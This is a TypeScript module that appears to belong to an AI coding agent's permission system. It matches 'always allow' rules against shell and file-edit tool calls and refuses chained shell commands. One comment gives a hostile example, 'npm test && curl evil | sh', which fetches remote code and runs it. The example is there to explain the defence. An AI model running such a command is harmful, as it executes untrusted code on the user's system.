import * as path from 'path';

import type { AllowRule } from './types.js';

type RuleShape = Omit<AllowRule, 'id' | 'createdAt'>;

const SHELL_TOOLS = new Set(['Bash', 'PowerShell']);
const FILE_TOOLS = new Set(['Edit', 'Write', 'MultiEdit', 'NotebookEdit']);
/** Anything that lets one command run, substitute or redirect into another:
 *  a rule for `npm test` must not approve `npm test && curl evil | sh`. */
const SHELL_CHAIN = /[;&|`$<>(){}\n\r]/;
const SUGGESTED_SHELL_TOKENS = 2;

function shellCommand(input: Record<string, unknown>): string | null {
  const cmd = typeof input.command === 'string' ? input.command.trim() : '';
  return cmd && !SHELL_CHAIN.test(cmd) ? cmd : null;
}

function filePath(input: Record<string, unknown>): string | null {
  const f = input.file_path ?? input.notebook_path;
  return typeof f === 'string' && f ? f : null;
}

/** Absolute, `..`-free, forward slashes; case-folded where the filesystem is. */
function normPath(p: string): string {
  const abs = path.resolve(p).replace(/\\/g, '/');
  return process.platform === 'win32' || process.platform === 'darwin' ? abs.toLowerCase() : abs;
}

export function ruleMatches(
  rule: AllowRule,
  toolName: string,
  input: Record<string, unknown>,
): boolean {
  if (rule.tool !== toolName) return false;
  if (SHELL_TOOLS.has(toolName)) {
    const cmd = shellCommand(input);
    if (!cmd || !rule.pattern) return false;
    return cmd === rule.pattern || cmd.startsWith(`${rule.pattern} `);
  }
  if (FILE_TOOLS.has(toolName)) {
    const file = filePath(input);
    if (!file || !rule.pattern) return false;
    const f = normPath(file);
    const dir = normPath(rule.pattern);
    return f === dir || f.startsWith(dir.endsWith('/') ? dir : `${dir}/`);
  }
  return true;
}

/** The rule "sempre permitir" creates for this call, or undefined when no
 *  safe one exists (a chained shell command). */
export function suggestRule(
  toolName: string,
  input: Record<string, unknown>,
): RuleShape | undefined {
  if (SHELL_TOOLS.has(toolName)) {
    const cmd = shellCommand(input);
    if (!cmd) return undefined;
    return {
      tool: toolName,
      pattern: cmd.split(/\s+/).slice(0, SUGGESTED_SHELL_TOKENS).join(' '),
    };
  }
  if (FILE_TOOLS.has(toolName)) {
    const file = filePath(input);
    return file ? { tool: toolName, pattern: path.dirname(path.resolve(file)) } : undefined;
  }
  return { tool: toolName };
}

export function describeRule(rule: RuleShape): string {
  return rule.pattern ? `${rule.tool}: ${rule.pattern}` : `${rule.tool} (qualquer uso)`;
}
